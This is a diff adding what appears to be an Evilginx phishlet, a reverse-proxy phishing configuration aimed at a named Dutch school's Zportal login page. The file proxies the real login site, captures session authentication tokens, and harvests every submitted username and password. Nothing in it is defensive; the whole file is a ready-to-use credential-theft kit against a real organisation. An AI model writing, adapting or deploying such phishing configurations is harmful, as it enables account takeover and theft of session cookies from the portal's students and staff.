@@ -1,0 +1,28 @@
+author: '@Jerp'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'augustinianum', orig_sub: 'augustinianum', domain: 'zportal.nl', session: true, is_landing: true}
+
+sub_filters:
+  - {triggers_on: 'somtoday.nl', orig_sub: 'augustinianum', domain: 'zportal.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+
+auth_tokens:
+  - domain: 'zportal.nl'
+
+auth_urls:
+  - '/home/news'
+  - '/home/.*'   
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'augustinianum.zportal.nl'
+  path: '/'
